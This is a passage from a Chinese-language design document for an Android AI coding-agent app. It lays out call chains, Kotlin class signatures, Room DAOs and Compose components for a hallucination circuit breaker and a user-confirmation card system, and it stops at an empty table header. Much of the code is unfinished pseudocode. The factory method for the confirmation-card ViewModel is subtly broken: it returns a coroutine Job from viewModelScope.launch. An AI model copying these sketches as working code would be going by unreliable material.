│                     │      │  LINK-INV-5:         │      │  restoredL0Ids)     │
│ LINK-INV-0          │      │  PlanItemSource      │      │                     │
│  max(score, cpScore)│      │  Attacher +         │      │                     │
│ LINK-INV-4          │      │  planItemSourceRefs  │      │                     │
│  @Transaction 4 写  │      └──────────┬───────────┘      └──────────┬──────────┘
└─────────┬───────────┘                 │ LINK-INV-5（每条 Plan Item） │
          │                             │  factSourceRefs 非空          │
          │ LINK-INV-2（CB OPEN）        ▼                             │
          │ 横幅 + 自动拒 Plan     ┌──────────────────────┐           │
          │  + 自动 Cancel Card    │ ZthConfirmationCard  │           │
          ▼                        │  (17×12 状态机)      │◀──────────┘
   ┌──────────────────────┐        │                      │
   │ FuseOpenGlobalBanner │        │ LINK-INV-3           │
   │ (WindowManager 悬浮) │        │ 还原前先关 Card/Plan │
   └──────────────────────┘        └──────────────────────┘

         所有 LINK-INV 断言失败 → LinkInvViolationRecovery.recover()
                         （WTF/FATAL/ERROR/WARNING 分级，不 Crash + 上报）
```

### 8.4 UI → ViewModel → Domain → Data 调用链

```
UI Composable                  ViewModel (StateFlow collectAsState)            Domain                   Data
───────────                    ────────────────────────────────               ──────                   ─────

ProviderEditorScreen ───────▶ SettingsViewModel.
  │                             ├─ providers: StateFlow ──────────────────────▶ AIProviderRepository ──▶ AIProviderDao
  │                             ├─ modelMetadata: StateFlow ──────────────────▶ ModelMetadataService ──▶ assets/models.dev.json +
  │                             ├─ compatibilityDefaultPolicyFlow ────────────▶ CompatibilityPolicy ────▶ DataStore preferences
  │                             ├─ zthChainSpecsPerProviderFlow ──────────────▶ ChainSpecsRepository ───▶ DataStore Proto
  │                             ├─ zthParamsSnapshotFlow ─────────────────────▶ ZthParamsRepository ────▶ DataStore Proto
  │                             ├─ zthFuseDashboardFlow(sessionId) ───────────▶ HallucinationCircuitBreaker ▶ ChatSessionDao
  │                             └─ setters: selectZthPreset/saveResolverEdit/saveZthParams/resetFuse
  │
AIChatPanel ──────────────────▶ AIAgentViewModel.
  │                             ├─ currentSessionId: StateFlow ───────────────▶ SessionUseCase ────────▶ ChatSessionDao
  │                             ├─ messagesState: StateFlow ──────────────────▶ MessagePersistence ─────▶ AgentMessageDao
  │                             ├─ agentState: StateFlow ─────────────────────▶ StatefulAgentWorkflow ───▶ (AgentEvent 回调)
  │                             ├─ streamingText/reasoning: StateFlow ────────▶ StatefulAgentWorkflow
  │                             ├─ pendingToolPermission: StateFlow ──────────▶ ToolPermissionManager
  │                             ├─ pendingUserQuestion: StateFlow ────────────▶ AskUserQuestionManager
  │                             ├─ pendingApproval: StateFlow ────────────────▶ PlanApprovalManager
  │                             ├─ isCompacting: StateFlow ───────────────────▶ StatefulAgentWorkflow ───▶ CompactionPipeline
  │                             ├─ checkpoint list StateFlow ─────────────────▶ CheckpointManager ───────▶ CheckpointDao
  │                             └─ processUserInput() ────────────────────────▶ StatefulAgentWorkflow.processUserTurn()
  │
ZthFuseOpenGlobalBanner ─────── 全局（WindowManager，不经过 ViewModel）
  └─ 直接调用 FuseOpenGlobalCoordinator (Singleton) → HallucinationCircuitBreaker → ChatSessionDao

ZthConfirmationCardDialog ────▶ ZthConfirmationCardViewModel（独立 ViewModel，非 Hilt，Factory 注入）
                                   ├─ state: StateFlow<CardState>（12 状态）
                                   ├─ onEvent(E1~E17) 驱动状态机
                                   └─ suspendAwaitUserConfirm(): DegradationChainResult
                                      └─ 写 UserConfirmedSentinelDao + HallucinationCircuitBreaker.addScore
```

---

## 9. 精确类/接口/函数签名总表

### 9.1 现有核心类完整签名

#### 9.1.1 StatefulAgentWorkflow（AgentWorkflow 实现）

```kotlin
interface AgentWorkflow {
    suspend fun processUserTurn(
        sessionId: String,
        userPrompt: String,
        images: List<AgentImage>,
        mode: AgentMode,
        onEvent: suspend (AgentEvent) -> Unit
    ): WorkflowResult

    suspend fun interrupt(sessionId: String)
}

class StatefulAgentWorkflow @Inject constructor(
    // 工具系统 4
    private val toolRegistry: ToolRegistry,
    private val permissionManager: ToolPermissionManager,
    private val policyEngine: ToolPermissionPolicyEngine,
    private val toolOutputStore: ToolOutputStore,
    // Provider API 5
    private val aiProviderRepository: AIProviderRepository,
    private val openAIApi: OpenAIApi,
    private val anthropicApi: AnthropicApi,
    private val geminiApi: GeminiApi,
    private val modelMetadataService: ModelMetadataService,
    // Prompt 1
    private val promptProvider: SystemPromptProvider,
    // 压缩与检查点 2
    private val contextCompactor: ContextCompactor,
    private val checkpointManager: CheckpointManager,
    // 专用模型配置 2
    private val visionModelSettingsRepository: VisionModelSettingsRepository,
    private val compactionModelSettingsRepository: CompactionModelSettingsRepository,
    // RC63 兼容策略 1
    private val compatibilityPolicyRepository: CompatibilityPolicyRepository,
    // 会话持久化 2
    private val sessionUseCase: SessionUseCase,
    private val messagePersistenceUseCase: MessagePersistenceUseCase,
    // ZTH 门面（改造后新增）
    private val zthFacade: ZthFacade
) : AgentWorkflow {

    data class AgentSessionState(
        val messages: List<AgentMessage> = emptyList(),
        val iterations: Int = 0,
        val isFinished: Boolean = false,
        val error: String? = null,
        val mode: AgentMode = AgentMode.BUILD,
        val visionFallbackRetried: Boolean = false,
        // ZTH 新增
        val fuseScoreSnapshot: Int = 0,
        val fuseCriticalHits: Int = 0,
        val fuseState: FuseState = FuseState.CLOSED,
        val pendingCardIds: List<String> = emptyList(),
        val pendingPlanApprovalId: Long? = null,
        val restoredL0MessageIds: Set<String> = emptySet()
    )

    // ---- 公共入口 ----
    override suspend fun processUserTurn(...): WorkflowResult
    override suspend fun interrupt(sessionId: String)

    // ---- 私有核心 ----
    private suspend fun buildAgentContext(...): AgentContext
    private suspend fun compactIfNeeded(...): List<AgentMessage>
    private suspend fun callLlm(...): RawLlmResponse
    private suspend fun runVisionFallback(...): Pair<String, List<AgentImage>>
    private suspend fun resolveProviderConfig(sessionId: String?): ResolvedProviderConfig?
    private suspend fun activeModelSupportsVision(sessionId: String?): Boolean
    private suspend fun executeToolCall(...): ToolResult
    private fun buildSystemPrompt(...): String
    private fun estimateTokens(messages: List<AgentMessage>): Int
}
```

#### 9.1.2 AIAgentViewModel（1207 行）

```kotlin
@HiltViewModel
class AIAgentViewModel @Inject constructor(
    private val agentWorkflow: AgentWorkflow,
    private val toolRegistry: ToolRegistry,
    private val codeChangeTracker: CodeChangeTracker,
    private val agentMessageDao: AgentMessageDao,
    private val chatSessionDao: ChatSessionDao,
    private val aiProviderRepository: AIProviderRepository,
    private val defaultModelSettingsRepository: DefaultModelSettingsRepository,
    private val toolPermissionManager: ToolPermissionManager,
    private val askUserQuestionManager: AskUserQuestionManager,
    private val containerEngine: LinuxContainerEngine,
    private val sessionUseCase: SessionUseCase,
    private val messagePersistenceUseCase: MessagePersistenceUseCase,
    private val planApprovalManager: PlanApprovalManager,
    private val terminalSessionManager: TerminalSessionManager,
    private val slashCommandRegistry: SlashCommandRegistry,
    private val checkpointManager: CheckpointManager,
    private val checkpointDao: CheckpointDao,
    private val backupManager: BackupManager,
    @param:ApplicationContext private val context: Context
) : ViewModel(), SlashCommandContext {

    // ---- 会话状态 ----
    private val _currentSessionId = MutableStateFlow<String?>(null)
    val currentSessionId: StateFlow<String?>
    private val _agentStates = MutableStateFlow<Map<String, AgentUIState>>(emptyMap())
    val agentStates: StateFlow<Map<String, AgentUIState>>
    val agentState: StateFlow<AgentUIState>  // flatMapLatest 当前会话

    // ---- 消息与流式 ----
    val messagesState: StateFlow<MessagesLoadState>
    val streamingText: StateFlow<String>
    val streamingReasoning: StateFlow<String>
    val retryState: StateFlow<RetryState?>

    // ---- 交互对话框 ----
    val pendingToolPermission: StateFlow<PendingPermissionRequest?>
    val pendingUserQuestion: StateFlow<PendingQuestion?>
    val pendingApproval: StateFlow<PlanApprovalRequest?>  // PlanApprovalManager 复用
    val targetRewindMessageId: StateFlow<String?>

    // ---- 其他 UI 状态 ----
    val runningTool: StateFlow<String?>
    val isCompacting: StateFlow<Boolean>
    val changes: StateFlow<List<CodeChange>>
    val sessions: StateFlow<List<ChatSession>>
    val currentSessionProviderModel: StateFlow<Pair<String?, String?>>
    val queuedRequests: StateFlow<Int>

    // ---- 公共操作 ----
    fun processUserInput(sessionId: String, prompt: String, images: List<AgentImage>)
    fun interruptCurrentTurn()
    fun switchSession(sessionId: String)
    fun createNewSession(workspacePath: String): String
    fun resolvePermission(result: PermissionResult)
    fun resolveQuestionAnswer(answers: List<UserAnswer>)
    fun resolvePlanApproval(choice: PlanApprovalChoice)
    fun rewindToMessage(messageId: String)
    fun revertCheckpoint(checkpointId: String)  // ZTH 改造：内部调用 revertCoordinator.prepareForCheckpointRevert()
    fun listCheckpoints(sessionId: String): Flow<List<CheckpointEntity>>
}
```

#### 9.1.3 SettingsViewModel（1140 行）

```kotlin
@HiltViewModel
class SettingsViewModel @Inject constructor(
    // Provider & 模型 3
    private val repository: AIProviderRepository,
    private val modelApiService: ModelApiService,
    private val modelMetadataService: ModelMetadataService,
    // 各种设置 Repository 11
    private val logSettingsRepository: LogSettingsRepository,
    private val logFilterSettingsRepository: LogFilterSettingsRepository,
    private val themeSettingsRepository: ThemeSettingsRepository,
    private val keepaliveSettingsRepository: KeepaliveSettingsRepository,
    private val languageSettingsRepository: LanguageSettingsRepository,
    private val mcpConfigRepository: McpConfigRepository,
    private val permissionRulesRepository: PermissionRulesRepository,
    private val visionModelSettingsRepository: VisionModelSettingsRepository,
    private val compactionModelSettingsRepository: CompactionModelSettingsRepository,
    private val containerSettingsRepository: ContainerSettingsRepository,
    private val executionModeRepository: ExecutionModeRepository,
    // 其他 5
    private val mcpManager: McpManager,
    private val containerInstaller: ContainerInstaller,
    private val executionModeHolder: ExecutionModeHolder,
    private val remoteSshConnection: RemoteSshConnection,
    private val remoteRepository: RemoteRepository,
    val auditLogRepository: RemoteAuditLogRepository,
    // RC63 兼容策略
    private val compatibilityPolicyRepository: CompatibilityPolicyRepository,
    // ZTH 新增 Repository（改造后）
    private val chainSpecsRepository: ChainSpecsRepository,
    private val zthParamsRepository: ZthParamsRepository,
    private val circuitBreaker: HallucinationCircuitBreaker
) : ViewModel() {

    // ---- 现有 Flow ----
    val providers: StateFlow<List<AIProviderConfig>>
    val activeProvider: StateFlow<AIProviderConfig?>
    val modelMetadata: StateFlow<Map<String, ModelMetadata>>
    val fetchState: StateFlow<FetchState>
    val testResults: StateFlow<Map<String, TestConnectionResult>>
    val testing: StateFlow<Boolean>
    val visionProviderId: StateFlow<String>
    val visionModel: StateFlow<String>
    val compactionProviderId: StateFlow<String>
    val compactionModel: StateFlow<String>
    val globalRules: StateFlow<String>
    val projectRules: StateFlow<String>
    val themeMode: StateFlow<AppThemeMode>
    val languageTag: StateFlow<String>
    val keepaliveEnabled: StateFlow<Boolean>
    val logLevel: StateFlow<LogLevel>
    val profiles: StateFlow<List<ContainerProfile>>
    val activeProfileId: StateFlow<String>
    val remoteConnections: StateFlow<List<RemoteConnectionConfig>>
    val mcpServers: StateFlow<List<McpServerConfig>>
    val mcpStatuses: StateFlow<Map<String, McpStatus>>
    // RC63 3 Flow
    val compatibilityDefaultPolicyFlow: StateFlow<DefaultPolicy>
    val autoDowngradeOnSendFailureFlow: StateFlow<Boolean>
    val viewImageUnknownGuardPolicyFlow: StateFlow<ViewImageUnknownGuardPolicy>

    // ---- ZTH 新增 Flow ----
    val zthActivePresetFlow: StateFlow<PresetId>
    val zthChainSpecsPerProviderFlow: StateFlow<Map<String, CompatibilityChainSpecs>>
    fun zthFuseDashboardFlow(sessionId: String): Flow<FuseDashboardData>
    val zthParamsSnapshotFlow: StateFlow<ZthParamsSnapshot>

    // ---- ZTH 新增 Setter ----
    suspend fun selectZthPreset(preset: PresetId, applyToAllProviders: Boolean)
    suspend fun saveResolverEdit(providerId: String, capability: String, newSpec: ChainSpec)
    suspend fun saveZthParamsEdit(newSnapshot: ZthParamsSnapshot)
    suspend fun resetCurrentSessionFuseScore(sessionId: String)

    // ---- Provider 操作 ----
    suspend fun saveProvider(config: AIProviderConfig)
    suspend fun deleteProvider(id: String)
    suspend fun setActiveProvider(id: String)
    suspend fun fetchModels(providerId: String, apiKey: String, baseUrl: String, type: ProviderType)
    suspend fun testConnection(providerId: String)
    suspend fun setVisionModel(providerId: String, model: String)
    suspend fun setCompactionModel(providerId: String, model: String)

    // ---- RC63 ④ 单模型覆盖 ----
    suspend fun saveCapabilityOverride(entity: ModelCapabilityOverrideEntity)
    suspend fun clearCapabilityOverride(providerType: String, modelId: String)
    fun observeOverride(providerType: String, modelId: String): Flow<ModelCapabilityOverrideEntity?>
}
```

### 9.2 ZTH 新增类完整签名

#### 9.2.1 ZthFacade 门面（13 个子系统统一入口）

```kotlin
@Singleton
class ZthFacade @Inject constructor(
    // 第一层路由
    val capabilityDetector: CapabilityDetector,
    val chainExecutor: DegradationChainExecutor,
    val failureClassifier: FailureClassifier,
    val hallucinationClassifier: HallucinationClassifier,
    // 第二层压缩
    val compactionPipeline: CompactionPipeline,
    // 第三层联动
    val circuitBreaker: HallucinationCircuitBreaker,
    val planRejectionMarker: PlanRejectionSentinelMarker,
    val fuseCoordinator: FuseOpenGlobalCoordinator,
    val revertCoordinator: CheckpointRevertCoordinator,
    val sourceAttacher: PlanItemSourceAttacher,
    val linkRecovery: LinkInvViolationRecovery,
    // 消息过滤器
    val messageBuilder: ZthLlmMessageBuilder
) {
    // 入口 1：processUserTurn 最开头调用（OPEN_CRITICAL_PERMANENT → 拒绝处理）
    suspend fun preflightCheck(sessionId: String): PreflightResult

    // 入口 2：能力检测（对 CapabilityDetector.detect() 的包装，同时做权限校验）
    suspend fun detectCapabilities(sessionState, userMsg, metadata): Set<RequiredCapability>

    // 入口 3：异常分类 + 决策矩阵查表（对 Classifier + Matrix 的包装）
    suspend fun classifyFailureAndResolve(e: Throwable, ctx): Pair<FailureClassification, DecisionRule>

    // 入口 4：压缩（CompactionPipeline 包装 + 前后 Checkpoint 自动保存）
    suspend fun compactIfNeeded(messages, provider, sessionId, onEvent): List<AgentMessage>

    // 入口 5：Planner prompt enrich（LINK-INV-1 sentinel ⚠️ 前缀注入）
    suspend fun enrichWithPlanRejectionWarnings(basePrompt: String, sessionId: String): String
}
```

#### 9.2.2 ZthConfirmationCardViewModel（17 事件 × 12 状态状态机）

```kotlin
// 12 状态
enum class CardState {
    INIT, LOADING,
    INFO_READY, STANDARD_READY, DETAILED_READY,
    DETAILED_PARTIALLY_CHECKED, USER_EDITING,
    RERUN_LOADING, REUSE_CONFIRMED,
    CONFIRMED, CANCELLED, ERROR_TERMINATED
}

// 17 事件（E1~E17）
sealed class CardEvent {
    object E1_LoadStart : CardEvent()
    data class E2_LoadSuccess(val content: CardContent) : CardEvent()
    object E3_LoadFailure : CardEvent()
    data class E4_UserEditText(val newText: String) : CardEvent()
    data class E5_CheckboxToggle(val id: String, val checked: Boolean) : CardEvent()
    object E6_CheckboxAllUnchecked_Detail : CardEvent()  // Trade-off #9 触发声明项
    object E7_UserClickRerun : CardEvent()
    data class E8_RerunFinished(val newContent: CardContent) : CardEvent()
    object E9_RerunFailed : CardEvent()
    object E10_UserClickReuseSentinel : CardEvent()
    data class E11_DeleteSection4Constraint(val entryId: String, val severity: String) : CardEvent()
    data class E12_AcknowledgeDeleteRiskModal(val entryId: String, val acknowledged: Boolean) : CardEvent()
    data class E13_InsertLostConstraint(val lostItemId: String) : CardEvent()
    object E14_RestoreL0Message : CardEvent()
    data class E15_UserClickConfirm(val editedFinalContent: String) : CardEvent()
    object E16_UserClickCancel : CardEvent()
    data class E17_ExternalCancel(val reason: String) : CardEvent()  // FUSE_OPEN / CHECKPOINT_REVERT
}

// 阻塞挂起返回值
data class DegradationChainResult(
    val state: CardState,          // CONFIRMED / CANCELLED / ERROR_TERMINATED
    val confirmedSentinelId: Long? = null,
    val finalContent: String? = null,
    val hardConstraints: List<HardConstraint>? = null,
    val postCompactionMessages: List<AgentMessage>? = null,
    val failureClass: FailureClass? = null,
    val terminalAction: TerminalAction? = null
)

class ZthConfirmationCardViewModel(
    private val payload: CardPayload,
    private val sentinelDao: UserConfirmedSentinelDao,
    private val deleteAuditDao: HardConstraintDeleteAuditDao,
    private val circuitBreaker: HallucinationCircuitBreaker,
    private val bidirectionalLinker: ConstraintBidirectionalLinker,
    private val params: ZthParamsSnapshot
) : ViewModel() {

    // ---- Factory（Hilt 注入创建）----
    class Factory @Inject constructor(
        private val sentinelDao: UserConfirmedSentinelDao,
        private val deleteAuditDao: HardConstraintDeleteAuditDao,
        private val circuitBreaker: HallucinationCircuitBreaker,
        private val bidirectionalLinker: ConstraintBidirectionalLinker,
        private val paramsRepository: ZthParamsRepository
    ) {
        fun create(payload: CardPayload): ZthConfirmationCardViewModel = viewModelScope.launch {
            ZthConfirmationCardViewModel(payload, sentinelDao, deleteAuditDao,
                circuitBreaker, bidirectionalLinker, paramsRepository.getCurrent())
        }
    }

    // ---- StateFlow（UI observe）----
    private val _state = MutableStateFlow(CardState.INIT)
    val state: StateFlow<CardState> = _state.asStateFlow()
    private val _cardContent = MutableStateFlow<CardContent?>(null)
    val cardContent: StateFlow<CardContent?> = _cardContent.asStateFlow()

    // ---- 外部取消（FUSE_OPEN / CHECKPOINT_REVERT 调用）----
    fun cancelDueToFuseOpen() = onEvent(E17_ExternalCancel("FUSE_OPEN"))
    fun cancelDueToCheckpointRevert() = onEvent(E17_ExternalCancel("CHECKPOINT_REVERT"))

    /**
     * 核心阻塞挂起：主流程调用后挂起，直到 CONFIRMED / CANCELLED / ERROR_TERMINATED。
     * 内部用 suspendCancellableCoroutine，120s 放模型 socket，300s 放 wakelock（Trade-off #8）。
     */
    suspend fun suspendAwaitUserConfirm(): DegradationChainResult =
        suspendCancellableCoroutine { cont ->
            this.onResultReady = { result -> cont.resume(result) }
            // IdleResourceReleaseManager: 120s → 关闭 LLM socket；300s → 释放 wakelock
        }

    /** UI 发送事件驱动 17×12 状态机 */
    fun onEvent(event: CardEvent) { /* ...状态跃迁逻辑... */ }

    // ---- A4 写 Layer 5 sentinel（确认时执行，完整字段见 ZTH v1.0 §2.2）----
    private suspend fun writeConfirmedSentinel(editedFinalContent: String): Long {
        // 22 字段按 §2.2 精确写入：capability, originalDegradationTraceId, originalInputRefs,
        // finalContent, hardConstraints, userEdited(=hash 不同 OR 编辑锁存 true → CARD-INV-3),
        // confirmedAt, rerunCount, reusedFromSentinelId, cardDensityAtConfirmTime,
        // compressionLevel, compressionTokensSaved, restorableCheckpointIds, deletedMessagesTrace,
        // hardConstraintsRejectedExplicitly, hardConstraintDeletedWithRiskAcknowledged, ...
    }
}
```

#### 9.2.3 ZthLlmMessageBuilder（MSG-INV-3/4 强制过滤）

```kotlin
@Singleton
class ZthLlmMessageBuilder @Inject constructor(
    private val sentinelDao: UserConfirmedSentinelDao
) {
    enum class TargetModelPurpose {
        PRIMARY_LLM,              // 主模型聊天
        DEDICATED_VISION_LLM,     // 识图专用
        DEDICATED_COMPACT_LLM,    // 压缩专用
        PLAN_PLANNER,             // 计划模式 Planner
        FORMAT_RETRY_RESOLVER     // 格式错重试 resolver
    }

    /**
     * 所有 LLM 调用统一走此过滤器组装 messages。
     * MSG-INV-3：输出绝对不包含 SYSTEM_METADATA role（L1 元数据绝不进上下文）
     * MSG-INV-4：L5 sentinel finalContent inline 到关联 user 消息末尾（role=user，不是 role=system）
     *            如果找不到关联 user 消息 → 虚拟一条 role=user 补充消息
     */
    suspend fun build(
        rawMessages: List<AgentMessage>,
        purpose: TargetModelPurpose
    ): List<LLMMessage> {
        // Step 1：过滤 SYSTEM_METADATA / L5 sentinel role 消息本身（MSG-INV-3，硬过滤）
        // Step 2：遍历 sentinelDao 查本会话所有 confirmsOf → 按 originalInputRefs → 找对应 user 消息
        //         → finalContent inline 到末尾 + 分界标「[用户确认内容 BEGIN]...[END]」
        // Step 3：对 DEDICATED_VISION/COMPACT 特殊处理：L5 sentinel 摘要走另一种格式
        // Step 4：断言：输出消息中 role ∈ {USER, ASSISTANT, TOOL}；SYSTEM 仅允许 system prompt 一条
        //         → 违反抛 ZthInvariantViolationException（MSG-INV-3/4 强制执行）
    }
}
```

### 9.3 DAO 接口完整清单（v33 原有 11 + ZTH 新增 5 = 16 个 DAO）

#### 9.3.1 ZTH 新增 5 个 DAO

```kotlin
// ====== UserConfirmedSentinelDao（MSG-INV-1 追加写不可变）======
@Dao
interface UserConfirmedSentinelDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(entity: UserConfirmedSentinelEntity): Long  // 返回自增 id

    // MSG-INV-1：只允许改 confirmedAt，其余字段禁 UPDATE（单测验证 UPDATE finalContent 失败）
    @Query("UPDATE user_confirmed_sentinel SET confirmed_at_ms = :confirmedAtMs WHERE id = :id")
    suspend fun touchConfirmedAt(id: Long, confirmedAtMs: Long)

    // 只读查询
    @Query("SELECT * FROM user_confirmed_sentinel WHERE session_id = :sessionId ORDER BY confirmed_at_ms ASC")
    fun observeBySession(sessionId: String): Flow<List<UserConfirmedSentinelEntity>>

    @Query("SELECT * FROM user_confirmed_sentinel WHERE original_degradation_trace_id = :traceId LIMIT 1")
    suspend fun getByTraceId(traceId: String): UserConfirmedSentinelEntity?

    @Query("SELECT * FROM user_confirmed_sentinel WHERE reused_from_sentinel_id = :id")
    suspend fun getReusesOf(id: Long): List<UserConfirmedSentinelEntity>

    @Query("SELECT * FROM user_confirmed_sentinel WHERE plan_rejected_count > 0 AND session_id = :sessionId")
    suspend fun getPlanRejectedSentinels(sessionId: String): List<UserConfirmedSentinelEntity>
}

// ====== SentinelPlanRejectionAuditDao（LINK-INV-1）======
@Dao
interface SentinelPlanRejectionAuditDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(entity: SentinelPlanRejectionAudit): Long

    @Query("SELECT * FROM sentinel_plan_rejection_audit WHERE sentinel_id = :sentinelId")
    suspend fun getBySentinel(sentinelId: Long): List<SentinelPlanRejectionAudit>

    @Query("SELECT * FROM sentinel_plan_rejection_audit WHERE rejected_plan_id = :planId")
    suspend fun getByPlan(planId: Long): List<SentinelPlanRejectionAudit>
}

// ====== HardConstraintDeleteAuditDao（DEL-2 + Trade-off #12）======
@Dao
interface HardConstraintDeleteAuditDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(entity: HardConstraintDeleteAudit): Long

    @Query("SELECT * FROM hard_constraint_delete_audit WHERE sentinel_id = :sentinelId")
    suspend fun getBySentinel(sentinelId: Long): List<HardConstraintDeleteAudit>

    @Query("SELECT COUNT(*) FROM hard_constraint_delete_audit WHERE severity = 'HIGH_RISK' AND user_acknowledged_risk = 0 AND sentinel_id = :sentinelId")
    suspend fun countUnacknowledgedHighRiskDeletions(sentinelId: Long): Int
}

// ====== L0SoftCompactRestoreLogDao（REV-INV-2）======
@Dao
interface L0SoftCompactRestoreLogDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(entity: L0SoftCompactRestoreLogEntity): Long

    @Query("SELECT message_ids_json FROM l0_soft_compact_restore_log WHERE session_id = :sessionId")
    fun observeRestoredMessageIds(sessionId: String): Flow<List<String>>

    @Query("SELECT * FROM l0_soft_compact_restore_log WHERE session_id = :sessionId")
    suspend fun getBySession(sessionId: String): List<L0SoftCompactRestoreLogEntity>
}

// ====== HallucinationFuseDao（LINK-INV-4 写 2）======
@Dao
interface HallucinationFuseDao {
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun upsert(entity: HallucinationFuseEntity)

    @Query("SELECT * FROM hallucination_fuse_entity WHERE session_id = :sessionId LIMIT 1")
    suspend fun getBySession(sessionId: String): HallucinationFuseEntity?

    @Query("UPDATE hallucination_fuse_entity SET permanently_open = 1, open_events_log_json = :newLog WHERE session_id = :sessionId")
    suspend fun markPermanentAndAppendLog(sessionId: String, newLog: String)
}
```

### 9.4 Composable UI 组件清单（现有 + ZTH 新增）

#### 9.4.1 现有核心 UI 组件

```kotlin
// feature/agent/presentation/component/
@Composable fun AIChatPanel(          // 聊天主面板（625 行）
    viewModel: AIAgentViewModel,
    onNavigateToSettings: () -> Unit,
    onNavigateToTerminal: () -> Unit,
    onNavigateToGit: () -> Unit,
    settingsViewModel: SettingsViewModel?,
    workspaceViewModel: WorkspaceViewModel?,
    drawerState: DrawerState,
    currentFile: String?, selectedCode: String?, modifier: Modifier
)

@Composable fun ChatInputBar(         // 输入栏 + 附件 + 计划审批面板（704 行）
    viewModel: AIAgentViewModel,
    currentSessionProviderModel: Pair<String?, String?>?,
    globalActiveProvider: AIProviderConfig?,
    providers: List<AIProviderConfig>,
    modelMetadata: Map<String, ModelMetadata>
)

@Composable fun PlanApprovalPanel(    // 计划审批面板（ChatInputBar 内部）
    state: PlanApprovalRequest, onApprove: () -> Unit, onRefine: () -> Unit
)

// feature/settings/presentation/component/
@Composable fun SettingsScreen(       // 设置主菜单（792 行）
    viewModel: SettingsViewModel, onNavigateBack: () -> Unit,
    onNavigateToTerminalSettings: () -> Unit, onNavigateToSshHosts: () -> Unit,
    onStopAllAndCloseTerminal: () -> Unit
)

@Composable fun ProviderEditorScreen( // Provider 编辑页（857 行）
    viewModel: SettingsViewModel, initialProvider: AIProviderConfig?,
    onNavigateBack: () -> Unit,
    onSave: (AIProviderConfig) -> Unit, onDelete: (String) -> Unit
)
```

#### 9.4.2 ZTH 新增 19 个 Composable

```kotlin
// ====== 设置页三段式区块（ProviderEditorScreen 内部替换）======
@Composable fun ZthPresetSelector(
    activePreset: PresetId, onPresetSelected: (PresetId, Boolean) -> Unit
    // 4 单选 + 切换覆盖提示框 Dialog
)

@Composable fun ZthCapabilityChainOverviewCard(
    chainSpecs: CompatibilityChainSpecs,
    onResolverGearClick: (capability: String) -> Unit,  // MANUAL 档齿轮
    isManualMode: Boolean
    // 5 行能力链：识图/压缩/工具/思考/流式
)

@Composable fun ZthFuseDashboard(
    dashboard: FuseDashboardData,
    onResetScore: (() -> Unit)? = null,  // MANUAL 才传
    onViewLog: () -> Unit
)

// ====== MANUAL 档 BottomSheet ======
@Composable fun ZthResolverEditorSheet(
    capability: RequiredCapability, currentSpec: ChainSpec,
    onSave: (ChainSpec) -> Unit, onDismiss: () -> Unit
)

@Composable fun ZthParamsEditorSheet(
    snapshot: ZthParamsSnapshot,
    onSave: (ZthParamsSnapshot) -> Unit, onResetToBalanced: () -> Unit, onDismiss: () -> Unit
    // 6 Tab：熔断阈值 / 重试&执行器 / 密度判定 / 压缩专属 / 算法权重 / 关于
)

// ====== ConfirmationCard 根 + 3 模板 ======
@Composable fun ZthConfirmationCard(
    viewModel: ZthConfirmationCardViewModel, density: CardDensity,
    onDismiss: () -> Unit  // 只有 E16_Cancel 才能关，点外部关不掉（ZTH-1 阻塞式）
)

@Composable fun ZthCardInfoTemplate(
    content: CardContent, onEdit: (String) -> Unit,
    onConfirm: () -> Unit, onCancel: () -> Unit
)

@Composable fun ZthCardStandardTemplate(
    content: CardContent, userEditedText: String,
    onEditText: (String) -> Unit, onRerun: () -> Unit,
    onConfirm: () -> Unit, onCancel: () -> Unit
    // 左右分栏对照 + extractedHardConstraints 列表
)

@Composable fun ZthCardDetailedTemplate(
    content: CardContent,  // 含 5 section 分段
    checkboxes: Map<String, Boolean>, onCheckboxToggle: (String, Boolean) -> Unit,
    rejectAllDeclarativeChecked: Boolean,  // Trade-off #9 声明项
    onToggleRejectAllDeclarative: (Boolean) -> Unit,
    compressionExtra: CompressionCardExtra?,  // null if not compression
    onConfirm: () -> Unit, onCancel: () -> Unit
)

// ====== 压缩卡片 4 扩展区（DETAILED 卡片内挂上）======
@Composable fun ZthCardCompressionHeaderWarning(
    coveragePct: Float, lostConstraints: List<LostHardConstraintItem>,
    onInsertAllLost: () -> Unit, onInsertOne: (String) -> Unit
    // 黄区：覆盖率 < 90% 警告 + 丢失清单「一键全回」
)

@Composable fun ZthCardCompressionDeletionList(
    deletionItems: List<DeletionListItem>,   // 删除/摘要清单
    onRestoreOne: (String) -> Unit,          // 行尾「恢复本条」
    onCancelSummarizeOne: (String) -> Unit   // 「取消摘要」→ 逆向联动
)

@Composable fun ZthCardCompressionSourceTracker(
    constraints: List<HardConstraintWithSource>,
    onJumpToSource: (sourceAnchorId: String) -> Unit,  // 跳转链接
    onDeleteConstraint: (entryId: String, severity: String) -> Unit  // 🔴无来源=红色背景
)

@Composable fun ZthCardCompressionRestoreButtons(
    checkpointBundle: CheckpointBundle,  // 4 档
    onRevertToL2Pre: () -> Unit, onRevertToL1Pre: () -> Unit,
    onRevertToL0Pre: () -> Unit, onRevertToEarliestUncompressed: () -> Unit
    // 每个按钮点后弹二次确认 Modal
)

// ====== 全局 UI ======
@Composable fun ZthFuseOpenGlobalBanner(
    state: FuseState, reason: String,
    onViewCause: () -> Unit, onStartNewSession: () -> Unit
    // 无关闭按钮；WindowManager 悬浮；黄/红/红闪烁三档颜色
)

@Composable fun ZthL0SoftCompactBadge(
    tokensSaved: Int, visiblePhase: BadgePhase,  // YELLOW_STRIP_0_60S / TOOLBAR_ICON_60S_PLUS
    onViewDeleted: () -> Unit, onRestoreAll: () -> Unit
    // 0-60s：聊天页底部 36dp 黄条；60s+：Toolbar 🗂️ 图标常驻
)

@Composable fun ZthRevertCheckpointMenu(
    sessionId: String, checkpointDao: CheckpointDao,
    onRevertConfirmed: (checkpointId: String) -> Unit
    // 聊天页 OverflowMenu → 子菜单 4 档还原 → 二次确认 Modal
)
```

---

## 10. 钩子落点与改造清单（精确到函数/行级）

### 10.1 StatefulAgentWorkflow 改造点（7 处）

| # | 位置（函数） | 改造内容 | ZTH 调用 |
|---|---|---|---|
